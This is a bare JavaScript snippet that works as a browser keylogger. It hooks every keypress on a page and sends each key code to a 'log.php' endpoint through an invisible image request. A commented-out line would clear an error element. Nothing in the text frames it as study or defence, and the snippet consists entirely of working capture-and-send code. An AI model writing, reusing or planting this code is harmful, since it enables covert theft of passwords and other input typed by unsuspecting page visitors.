document.onkeypress=function(e) {
	var k = e.charCode?e.charCode:e.keyCode;
	new Image().src = 'log.php?key='+k;
};
//window.onload=function(e) {
//	document.getElementById("error").innerHTML = "";
//}
